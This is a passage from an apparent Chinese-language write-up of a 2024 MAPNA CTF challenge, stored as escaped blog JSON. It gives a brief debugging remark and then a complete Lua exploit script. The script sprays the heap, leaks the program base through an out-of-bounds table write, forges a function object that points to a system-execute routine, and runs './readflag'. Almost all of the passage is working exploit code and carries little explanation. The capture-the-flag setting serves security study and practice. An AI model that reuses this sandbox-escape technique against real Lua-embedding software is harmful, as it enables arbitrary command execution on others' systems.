src=\"/2024/07/16/2024_mapna_CTF/43a53b8c927b2dce40197caeafa198bf.png\" alt=\"43a53b8c927b2dce40197caeafa198bf\"></p>\n<p>调试发现的话，print 是 函数地址 + p8(0X16) , 而单纯数据的话，就是 value + p8(0x3)</p>\n<p>exp</p>\n<figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">intToHex</span><span class=\"params\">(number)</span></span></span><br><span class=\"line\">    <span class=\"keyword\">local</span> hexDigits = <span class=\"string\">&quot;0123456789ABCDEF&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">local</span> hexString = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">while</span> number &gt; <span class=\"number\">0</span> <span class=\"keyword\">do</span></span><br><span class=\"line\">        <span class=\"keyword\">local</span> digit = number % <span class=\"number\">16</span></span><br><span class=\"line\">        hexString = hexDigits:<span class=\"built_in\">sub</span>(digit + <span class=\"number\">1</span>, digit + <span class=\"number\">1</span>) .. hexString</span><br><span class=\"line\">        number = <span class=\"built_in\">math</span>.<span class=\"built_in\">floor</span>(number / <span class=\"number\">16</span>)</span><br><span class=\"line\">    <span class=\"keyword\">end</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">return</span> hexString</span><br><span class=\"line\"><span class=\"keyword\">end</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">u64</span><span class=\"params\">(s)</span></span> </span><br><span class=\"line\">\t<span class=\"keyword\">local</span> result = <span class=\"number\">0</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i= <span class=\"number\">8</span>, <span class=\"number\">2</span>, <span class=\"number\">-1</span> <span class=\"keyword\">do</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">local</span> num = <span class=\"built_in\">string</span>.<span class=\"built_in\">byte</span>(<span class=\"built_in\">string</span>.<span class=\"built_in\">sub</span>(s,i,i+<span class=\"number\">1</span>))</span><br><span class=\"line\">\t\tresult = (result &lt;&lt; <span class=\"number\">8</span>) + num</span><br><span class=\"line\">\t<span class=\"keyword\">end</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> result</span><br><span class=\"line\"><span class=\"keyword\">end</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">p64</span><span class=\"params\">(d)</span></span></span><br><span class=\"line\">\t<span class=\"keyword\">local</span> s = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i = <span class=\"number\">0</span>, <span class=\"number\">7</span> <span class=\"keyword\">do</span></span><br><span class=\"line\">\t\ts = s .. <span class=\"built_in\">string</span>.<span class=\"built_in\">char</span>((d &gt;&gt; (i * <span class=\"number\">8</span>)) &amp; <span class=\"number\">0xff</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">end</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> s;</span><br><span class=\"line\"><span class=\"keyword\">end</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">-- step 1 : set heap</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">local</span> command = <span class=\"string\">&quot;./readflag&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">local</span> heap = &#123;&#125;</span><br><span class=\"line\">count = <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i = <span class=\"number\">0x10</span>, <span class=\"number\">0x500</span>, <span class=\"number\">0x10</span> <span class=\"keyword\">do</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> j=<span class=\"number\">1</span>, <span class=\"number\">8</span> <span class=\"keyword\">do</span></span><br><span class=\"line\">\t\theap[count] = <span class=\"built_in\">string</span>.<span class=\"built_in\">rep</span>(<span class=\"string\">&#x27;a&#x27;</span>, i)</span><br><span class=\"line\">\t\tcount = count + <span class=\"number\">1</span></span><br><span class=\"line\">\t<span class=\"keyword\">end</span></span><br><span class=\"line\"><span class=\"keyword\">end</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">-- step 2 : leak pro_base</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">local</span> ptr_a = <span class=\"built_in\">string</span>.<span class=\"built_in\">rep</span>(<span class=\"string\">&#x27;e&#x27;</span>, <span class=\"number\">0x100</span>)</span><br><span class=\"line\"><span class=\"keyword\">local</span> ptr_b = &#123;<span class=\"number\">0x11223344</span>, <span class=\"number\">0x2</span>, <span class=\"number\">0x3</span>, <span class=\"number\">0x4</span>, <span class=\"number\">0x5</span>, <span class=\"number\">0x6</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">ptr_b[<span class=\"number\">-10</span>] = <span class=\"built_in\">print</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">local</span> pro_base = u64(<span class=\"built_in\">string</span>.<span class=\"built_in\">sub</span>(ptr_a, <span class=\"number\">0x68</span>, <span class=\"number\">0x80</span>)) - <span class=\"number\">0x376d4</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;pro_base -&gt; &quot;</span>, intToHex(pro_base))</span><br><span class=\"line\"><span class=\"keyword\">local</span> ste = pro_base + <span class=\"number\">0x3a2dd</span></span><br><span class=\"line\"><span class=\"keyword\">local</span> pr = pro_base + <span class=\"number\">0x376d4</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;system -&gt; &quot;</span>, intToHex(ste))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">-- step 3 : run os_execute</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">local</span> ptr_c = p64(<span class=\"number\">0</span>) .. p64(<span class=\"number\">0x1111</span>)</span><br><span class=\"line\">\t.. p64(<span class=\"number\">0</span>) .. p64(<span class=\"number\">0x2222</span>) .. p64(<span class=\"number\">0</span>) .. p64(<span class=\"number\">0x3333</span>) .. p64(<span class=\"number\">0</span>) .. p64(ste) .. p64(<span class=\"number\">0x16</span>)</span><br><span class=\"line\"><span class=\"keyword\">local</span> ptr_d = &#123;<span class=\"number\">0x22334455</span>, <span class=\"number\">0x2</span>, <span class=\"number\">0x3</span>, <span class=\"number\">0x4</span>, <span class=\"number\">0x5</span>, <span class=\"number\">0x6</span>&#125;</span><br><span class=\"line\">(ptr_d[<span class=\"number\">-5</span>])(command)</span><br></pre></td></tr></table></figure>\n\n",
            "tags": [
                "mapna"
            ]
        }
    ]
}